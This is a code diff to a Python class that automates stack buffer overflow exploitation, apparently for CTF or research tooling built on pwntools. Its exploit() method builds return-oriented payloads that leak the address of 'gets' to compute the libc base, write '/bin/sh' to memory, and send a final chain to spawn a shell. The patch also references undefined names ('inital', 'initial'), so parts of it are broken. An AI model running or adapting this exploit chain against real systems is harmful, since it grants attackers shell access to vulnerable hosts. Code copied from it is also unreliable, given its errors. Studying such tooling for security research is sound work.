@@ -51,6 +51,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
             binary : pwn.ELF,
             libc : pwn.ELF,
             targetFunc,
+            functionExit,
             stackOffset,
             suffix):
         self.function = function
@@ -58,7 +59,9 @@ class StackBufferOverflowVulnerability(Vulnerability):
         self.libc = libc
         self.targetFunc = targetFunc
         self.stackOffset = stackOffset
+        self.functionExit = functionExit
         self.suffix = suffix
+        self.initial = inital
     
     def __str__(self):
         fields = {
@@ -92,12 +95,17 @@ class StackBufferOverflowVulnerability(Vulnerability):
                 suffix = options.get("sbo.suffix", None)
                 if suffix:
                     suffix = suffix.replace("\\n", "\n")
+                if initial:
+                    initial = initial.replace("\\n", "\n")
+
                 return StackBufferOverflowVulnerability(function,
                     context.binary,
                     context.libc,
                     targetFunc=targetFunc,
+                    functionExit=function["exitAddresses"][0],
                     stackOffset=stackOffset,
-                    suffix=suffix)
+                    suffix=suffix,
+                    initial=initial)
                     
             # Work in progress apparently
             # Notes, uses old construction logic, need to update when you get around
@@ -124,7 +132,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
 
     # TODO: gate on detect
     def exploit(self, conn):
-        conn = conn.conn
+        sconn = conn.conn
         function_addr = int(self.function["address"], 16) 
         
         prefix = b"A"*abs(self.stackOffset)
@@ -139,25 +147,43 @@ class StackBufferOverflowVulnerability(Vulnerability):
         sm.ret(function_addr, "binary")
         payload1 = sm.resolve(binary=0x0, libc=0x0)
 
-        # clear out any pending stdout
-        res = conn.recv()
+        # Navigate to targetFunc
+        if self.initial:
+            logger.info("Using provided intial value to clear stdout")
+            sconn.recvuntil(self.initial)
+        else:
+            logger.info("Navigating to targetFunc.")
+            conn.navigate(self.targetFunc)
+
+        res = sconn.recv()
         logger.debug(f"Initial: {res}")
 
         # read libc location
-        logger.info("Sending first payload")
-        conn.sendline(payload1)
+        logger.info("Sending first payload (to leak 'gets' location)")
+        sconn.sendline(payload1)
 
         # Need to perform drain of non libc stuff
         if self.suffix:
-            res = conn.recvuntil(self.suffix)
+            res = sconn.recvuntil(self.suffix)
             logger.debug(f"Received suffix: {res}")
+        else:
+            logger.info("Navigating to function exit")
+            conn.navigate(self.functionExit)
 
-        # Now we are at the actual payload
-        gets_location = conn.recvline()[:-1]
+        # We've hit the return, next output is now the 'gets' address
+        gets_location = sconn.recvline()[:-1]
         logger.debug(f"gets_location: {gets_location}")
         gets_location = int.from_bytes(gets_location, byteorder='little')
         libcoffset = gets_location - self.libc.symbols["gets"]
         logger.info("Libc found at {}".format(hex(libcoffset)))
+
+        # need to navigate back to the targetFunc
+        if self.initial:
+            logger.info("Using provided intial value to clear stdout")
+            sconn.recvuntil(self.initial)
+        else:
+            logger.info("Navigating to targetFunc.")
+            conn.navigate(self.targetFunc)
 
         # send /bin/sh
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
@@ -167,13 +193,14 @@ class StackBufferOverflowVulnerability(Vulnerability):
         sm.ret(function_addr, "binary")
         payload2 = sm.resolve(binary=0x0)
         
-        logger.info("sending second payload")
-        conn.sendline(payload2)
-        conn.sendline("/bin/sh\x00")
+        logger.info("Sending second payload (setup write to controlled memory)")
+        sconn.sendline(payload2)
+        logger.info("Navigating to return.")
+        sconn.sendline("/bin/sh\x00")
 
         # TODO: This isn't strictly necesary, and
         # would be better to detect via a model.
-        res = conn.recv(timeout=1)
+        res = sconn.recv(timeout=1)
         logger.debug(f"clearing out any re-entry text: {res}")
 
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
@@ -185,4 +212,4 @@ class StackBufferOverflowVulnerability(Vulnerability):
         payload3 = sm.resolve(binary=0x0, libc=libcoffset)
 
         logger.info("Sending final payload")
-        conn.sendline(payload3)
+        sconn.sendline(payload3)
